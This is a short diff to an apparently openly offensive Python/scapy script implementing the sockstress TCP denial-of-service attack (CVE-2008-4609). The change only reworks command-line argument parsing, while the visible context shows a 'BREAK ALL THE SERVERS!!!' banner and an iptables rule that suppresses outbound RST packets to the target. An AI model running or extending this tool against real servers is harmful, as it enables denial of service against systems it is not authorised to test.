@@ -28,13 +28,17 @@ from scapy.layers.inet import IP, TCP
 from scapy.sendrecv import send, sr1
 
 
-def commandline(argv: list[str]) -> argparse.Namespace:
+def commandline() -> argparse.Namespace:
     """ Commandline arguments """
-    parser = argparse.ArgumentParser()
-    parser.add_argument('target', type=IPv4Address)
-    parser.add_argument('port', type=int)
-    parser.add_argument('-t', '--threads', type=int, default=20)
-    return parser.parse_args(argv)
+    parser = argparse.ArgumentParser(
+            description='TCP sockstress implementation for CVE-2008-4609.')
+    parser.add_argument('target', type=IPv4Address,
+                        help='target ipv4 address.')
+    parser.add_argument('port', type=int,
+                        help='target Port - must be reachable!')
+    parser.add_argument('-t', '--threads', type=int, default=20,
+                        help='number of threads to run in parallel (default: 20)')
+    return parser.parse_args()
 
 
 def sockstress(dstaddr: IPv4Address, dstport: int) -> None:
@@ -70,7 +74,7 @@ print("**  by Pan0pt1c0n (Justin Hutchens)                 **")
 print("**  BREAK ALL THE SERVERS!!!                         **")
 print("*******************************************************\n\n")
 
-options = commandline(sys.argv)
+options = commandline()
 
 ## Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections
 os.system(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {options.target} -j DROP')
